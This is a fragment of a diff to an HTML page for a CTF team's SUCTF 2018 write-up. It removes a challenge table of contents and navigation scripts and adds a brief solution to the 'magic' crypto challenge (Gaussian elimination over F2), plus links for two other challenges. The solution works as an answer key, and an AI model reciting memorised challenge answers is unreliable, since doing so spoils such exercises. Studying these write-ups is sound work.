-                <div class="toc"><ul class="nav"><li class=""><a href="#SUCTF-2018" title="SUCTF 2018">SUCTF 2018</a><ul class="nav"><li><a href="#web" title="web">web</a><ul class="nav"><li><a href="#Anonymous-bookgin" title="Anonymous (bookgin)">Anonymous (bookgin)</a></li><li><a href="#Getshell-unsolved-written-bookgin" title="Getshell (unsolved, written bookgin)">Getshell (unsolved, written bookgin)</a></li></ul></li><li><a href="#rev" title="rev">rev</a><ul class="nav"><li><a href="#python-sasdf" title="python (sasdf)">python (sasdf)</a></li><li><a href="#Enigma-sasdf" title="Enigma (sasdf)">Enigma (sasdf)</a></li><li><a href="#Rubber-Ducky-sasdf" title="Rubber Ducky (sasdf)">Rubber Ducky (sasdf)</a></li><li><a href="#RoughLike与期末大作业-sces60107" title="RoughLike与期末大作业 (sces60107)">RoughLike与期末大作业 (sces60107)</a></li><li><a href="#babyre-sces60107" title="babyre (sces60107)">babyre (sces60107)</a></li><li><a href="#simpleformat-sces60107" title="simpleformat (sces60107)">simpleformat (sces60107)</a></li></ul></li><li><a href="#misc" title="misc">misc</a><ul class="nav"><li><a href="#TNT-sasdf-bookgin" title="TNT (sasdf, bookgin)">TNT (sasdf, bookgin)</a></li><li><a href="#SandGame-b04902036" title="SandGame (b04902036)">SandGame (b04902036)</a></li><li><a href="#Cyclic-b04902036" title="Cyclic (b04902036)">Cyclic (b04902036)</a></li><li><a href="#Game-b04902036" title="Game (b04902036)">Game (b04902036)</a></li></ul></li><li><a href="#pwn" title="pwn">pwn</a><ul class="nav"><li><a href="#Note-kevin47" title="Note (kevin47)">Note (kevin47)</a></li><li><a href="#Heap-b04902036" title="Heap (b04902036)">Heap (b04902036)</a></li></ul></li><li><a href="#crypto" title="crypto">crypto</a><ul class="nav"><li><a href="#Enjoy-b04902036" title="Enjoy (b04902036)">Enjoy (b04902036)</a></li><li><a href="#Rsa-good-b04902036" title="Rsa good (b04902036)">Rsa good (b04902036)</a></li><li><a href="#magic-sasdf" title="magic (sasdf)">magic (sasdf)</a></li><li><a href="#rsa-sasdf" title="rsa (sasdf)">rsa (sasdf)</a></li><li><a href="#pass-sasdf" title="pass (sasdf)">pass (sasdf)</a></li></ul></li></ul></li></ul></div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
-            </ul>
-        </div>
+</ol>
+<h3 id="magic-(sasdf)"><a class="header-link" href="#magic-(sasdf)"></a>magic (sasdf)</h3>
+<p>The hash algorithm in <code>playMagic</code> is <code>sum(bin(magic[i] &amp; key)) % 2</code>, repeating 256 times to generate 256 bit hash. So we have 256 simultaneous equtations of key under Galois field $F_2$. Solve the equations by Gaussian elimination to get the flag.</p>
+<h3 id="rsa-(sasdf)"><a class="header-link" href="#rsa-(sasdf)"></a>rsa (sasdf)</h3>
+<p>Refer to <a href="https://balsn.github.io/ctf_writeup/20180526-suctf/#rsa-sasdf">https://balsn.github.io/ctf_writeup/20180526-suctf/#rsa-sasdf</a></p>
+<h3 id="pass-(sasdf)"><a class="header-link" href="#pass-(sasdf)"></a>pass (sasdf)</h3>
+<p>Refer to <a href="https://balsn.github.io/ctf_writeup/20180526-suctf/#pass-sasdf">https://balsn.github.io/ctf_writeup/20180526-suctf/#pass-sasdf</a></p>
+<h4 id="authentication-scheme"><a class="header-link" href="#authentication-scheme"></a>Authentication scheme</h4>
+<h4 id="prng"><a class="header-link" href="#prng"></a>PRNG</h4>
+        </article>
+      </div>
     </div>
-    <div id="ui-toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print" data-spy="affix" style="top:17px;display:none;"  >
-        <div class="toc"><ul class="nav"><li class=""><a href="#SUCTF-2018" title="SUCTF 2018">SUCTF 2018</a><ul class="nav"><li><a href="#web" title="web">web</a><ul class="nav"><li><a href="#Anonymous-bookgin" title="Anonymous (bookgin)">Anonymous (bookgin)</a></li><li><a href="#Getshell-unsolved-written-bookgin" title="Getshell (unsolved, written bookgin)">Getshell (unsolved, written bookgin)</a></li></ul></li><li><a href="#rev" title="rev">rev</a><ul class="nav"><li><a href="#python-sasdf" title="python (sasdf)">python (sasdf)</a></li><li><a href="#Enigma-sasdf" title="Enigma (sasdf)">Enigma (sasdf)</a></li><li><a href="#Rubber-Ducky-sasdf" title="Rubber Ducky (sasdf)">Rubber Ducky (sasdf)</a></li><li><a href="#RoughLike与期末大作业-sces60107" title="RoughLike与期末大作业 (sces60107)">RoughLike与期末大作业 (sces60107)</a></li><li><a href="#babyre-sces60107" title="babyre (sces60107)">babyre (sces60107)</a></li><li><a href="#simpleformat-sces60107" title="simpleformat (sces60107)">simpleformat (sces60107)</a></li></ul></li><li><a href="#misc" title="misc">misc</a><ul class="nav"><li><a href="#TNT-sasdf-bookgin" title="TNT (sasdf, bookgin)">TNT (sasdf, bookgin)</a></li><li><a href="#SandGame-b04902036" title="SandGame (b04902036)">SandGame (b04902036)</a></li><li><a href="#Cyclic-b04902036" title="Cyclic (b04902036)">Cyclic (b04902036)</a></li><li><a href="#Game-b04902036" title="Game (b04902036)">Game (b04902036)</a></li></ul></li><li><a href="#pwn" title="pwn">pwn</a><ul class="nav"><li><a href="#Note-kevin47" title="Note (kevin47)">Note (kevin47)</a></li><li><a href="#Heap-b04902036" title="Heap (b04902036)">Heap (b04902036)</a></li></ul></li><li><a href="#crypto" title="crypto">crypto</a><ul class="nav"><li><a href="#Enjoy-b04902036" title="Enjoy (b04902036)">Enjoy (b04902036)</a></li><li><a href="#Rsa-good-b04902036" title="Rsa good (b04902036)">Rsa good (b04902036)</a></li><li><a href="#magic-sasdf" title="magic (sasdf)">magic (sasdf)</a></li><li><a href="#rsa-sasdf" title="rsa (sasdf)">rsa (sasdf)</a></li><li><a href="#pass-sasdf" title="pass (sasdf)">pass (sasdf)</a></li></ul></li></ul></li></ul></div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
-    </div>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha256-U5ZEeKfGNOja007MMD3YBI0A3OSZOQbeG6z2f2Y0hu8=" crossorigin="anonymous" defer></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gist-embed/2.6.0/gist-embed.min.js" integrity="sha256-KyF2D6xPIJUW5sUDSs93vWyZm+1RzIpKCexxElmxl8g=" crossorigin="anonymous" defer></script>
-    <script>
-        var markdown = $(".markdown-body");
-        //smooth all hash trigger scrolling
-        function smoothHashScroll() {
-            var hashElements = $("a[href^='#']").toArray();
-            for (var i = 0; i < hashElements.length; i++) {
-                var element = hashElements[i];
-                var $element = $(element);
-                var hash = element.hash;
-                if (hash) {
-                    $element.on('click', function (e) {
-                        // store hash
-                        var hash = this.hash;
-                        if ($(hash).length <= 0) return;
-                        // prevent default anchor click behavior
-                        e.preventDefault();
-                        // animate
-                        $('body, html').stop(true, true).animate({
-                            scrollTop: $(hash).offset().top
-                        }, 100, "linear", function () {
-                            // when done, add hash to url
-                            // (default click behaviour)
-                            window.location.hash = hash;
-                        });
-                    });
-                }
-            }
-        }
-
-        smoothHashScroll();
-        var toc = $('.ui-toc');
-        var tocAffix = $('.ui-affix-toc');
-        var tocDropdown = $('.ui-toc-dropdown');
-        //toc
-        tocDropdown.click(function (e) {
-            e.stopPropagation();
-        });
-
-        var enoughForAffixToc = true;
-
-        function generateScrollspy() {
-            $(document.body).scrollspy({
-                target: ''
-            });
-            $(document.body).scrollspy('refresh');
-            if (enoughForAffixToc) {
-                toc.hide();
-                tocAffix.show();
-            } else {
-                tocAffix.hide();
-                toc.show();
-            }
-            $(document.body).scroll();
-        }
-
-        function windowResize() {
-            //toc right
-            var paddingRight = parseFloat(markdown.css('padding-right'));
-            var right = ($(window).width() - (markdown.offset().left + markdown.outerWidth() - paddingRight));
-            toc.css('right', right + 'px');
-            //affix toc left
-            var newbool;
-            var rightMargin = (markdown.parent().outerWidth() - markdown.outerWidth()) / 2;
-            //for ipad or wider device
-            if (rightMargin >= 133) {
-                newbool = true;
-                var affixLeftMargin = (tocAffix.outerWidth() - tocAffix.width()) / 2;
-                var left = markdown.offset().left + markdown.outerWidth() - affixLeftMargin;
-                tocAffix.css('left', left + 'px');
-            } else {
-                newbool = false;
-            }
-            if (newbool != enoughForAffixToc) {
-                enoughForAffixToc = newbool;
-                generateScrollspy();
-            }
-        }
-        $(window).resize(function () {
-            windowResize();
-        });
-        $(document).ready(function () {
-            windowResize();
-            generateScrollspy();
-        });
-
-        //remove hash
-        function removeHash() {
-            window.location.hash = '';
-        }
-
-        var backtotop = $('.back-to-top');
-        var gotobottom = $('.go-to-bottom');
-
-        backtotop.click(function (e) {
-            e.preventDefault();
-            e.stopPropagation();
-            if (scrollToTop)
-                scrollToTop();
-            removeHash();
-        });
-        gotobottom.click(function (e) {
-            e.preventDefault();
-            e.stopPropagation();
-            if (scrollToBottom)
-                scrollToBottom();
-            removeHash();
-        });
-
-        var toggle = $('.expand-toggle');
-        var tocExpand = false;
-
-        checkExpandToggle();
-        toggle.click(function (e) {
-            e.preventDefault();
-            e.stopPropagation();
-            tocExpand = !tocExpand;
-            checkExpandToggle();
-        })
-
-        function checkExpandToggle () {
-            var toc = $('.ui-toc-dropdown .toc');
-            var toggle = $('.expand-toggle');
-            if (!tocExpand) {
-                toc.removeClass('expand');
-                toggle.text('Expand all');
-            } else {
-                toc.addClass('expand');
-                toggle.text('Collapse all');
-            }
-        }
-
-        function scrollToTop() {
-            $('body, html').stop(true, true).animate({
-                scrollTop: 0
-            }, 100, "linear");
-        }
-
-        function scrollToBottom() {
-            $('body, html').stop(true, true).animate({
-                scrollTop: $(document.body)[0].scrollHeight
-            }, 100, "linear");
-        }
-    </script>
-</body>
-
+  </body>
 </html>
